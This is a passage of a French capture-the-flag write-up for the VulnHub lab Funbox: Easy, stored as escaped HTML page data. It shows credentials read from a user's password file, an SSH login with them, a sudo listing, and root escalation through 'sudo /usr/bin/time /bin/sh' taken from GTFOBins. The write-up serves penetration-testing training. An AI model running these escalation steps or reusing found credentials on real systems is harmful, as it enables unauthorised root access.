operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E33\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Ewww-data\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EEn remontant dans le r√©pertoire \"\u002Fhome\", on d√©couvre un utilisateur \"tony\" avec un fichier \"password.txt\".\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Ecat\u003C\u002Fspan\u003E \u002Fhome\u002Ftony\u002Fpassword.txt\nssh: yxcvbnmYYY\ngym\u002Fadmin: asdfghjklXXX\n\u002Fstore: admin@admin.com admin\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn tente la connexion SSH.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Essh\u003C\u002Fspan\u003E tony@localhost\ntony@localhost's password: yxcvbnmYYY\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Ch2\u003EEscalation\u003C\u002Fh2\u003E\n\u003Cp\u003EOn regarde les privil√®ges que poss√®dent cet utilisateur.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Esudo\u003C\u002Fspan\u003E -l\nUser tony may run the following commands on funbox3:\n\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E NOPASSWD: \u002Fusr\u002Fbin\u002Fyelp\n\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E NOPASSWD: \u002Fusr\u002Fbin\u002Fdmf\n\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E NOPASSWD: \u002Fusr\u002Fbin\u002Fwhois\n\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E NOPASSWD: \u002Fusr\u002Fbin\u002Frlogin\n\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E NOPASSWD: \u002Fusr\u002Fbin\u002Fpkexec\n\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E NOPASSWD: \u002Fusr\u002Fbin\u002Fmtr\n\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E NOPASSWD: \u002Fusr\u002Fbin\u002Ffinger\n\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E NOPASSWD: \u002Fusr\u002Fbin\u002Ftime\n\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E NOPASSWD: \u002Fusr\u002Fbin\u002Fcancel\n\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E NOPASSWD:\n\u002Froot\u002Fa\u002Fb\u002Fc\u002Fd\u002Fe\u002Ff\u002Fg\u002Fh\u002Fi\u002Fj\u002Fk\u002Fl\u002Fm\u002Fn\u002Fo\u002Fq\u002Fr\u002Fs\u002Ft\u002Fu\u002Fv\u002Fw\u002Fx\u002Fy\u002Fz\u002F.smile.sh\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003ESur \u003Ca href=\"https:\u002F\u002Fgtfobins.github.io\u002Fgtfobins\u002Ftime\u002F#sudo\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003EGTFOBins\u003C\u002Fa\u003E, on regarde quelle commande permet d'utiliser la commande \"time\" en tant que \"sudo\" dans le terminal.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E\u003Cspan class=\"token function\"\u003Esudo\u003C\u002Fspan\u003E \u002Fusr\u002Fbin\u002Ftime \u002Fbin\u002Fsh\n$ python3 -c \u003Cspan class=\"token string\"\u003E'import pty;pty.spawn(\"\u002Fbin\u002Fbash\")'\u003C\u002Fspan\u003E\n\u003Cspan class=\"token function\"\u003Eid\u003C\u002Fspan\u003E\n\u003Cspan class=\"token assign-left variable\"\u003Euid\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token assign-left variable\"\u003Egid\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token assign-left variable\"\u003Egroups\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EDans le r√©pertoire de l'utilisateur \"root\", on trouve le flag dans le fichier \"root.flag\" \u003Ccode class=\"language-text\"\u003Ecat \u002Froot\u002Froot.flag\u003C\u002Fcode\u003E.\u003C\u002Fp\u003E\n","download":"https:\u002F\u002Fwww.vulnhub.com\u002Fentry\u002Ffunbox-easy,526","tags":[{"title":"Pentest","path":"\u002Ftag\u002FPentest\u002F"},{"title":"CTF","path":"\u002Ftag\u002FCTF\u002F"}],"timeToRead":4,"parts":[{"title":"CTF Funbox: Easy","href":""},{"title":"CTF Funbox: Script Kiddie","href":"ctf-funbox-script-kiddie"}]}},"context":{}};(function(){var s;(s=document.currentScript||document.scripts[document.scripts.length-1]).parentNode.removeChild(s);}());</script><script src="/assets/js/app.8917d561.js" defer></script><script src="/assets/js/page--src-templates-post-vue.93f54eeb.js" defer></script>
  </body>
</html>
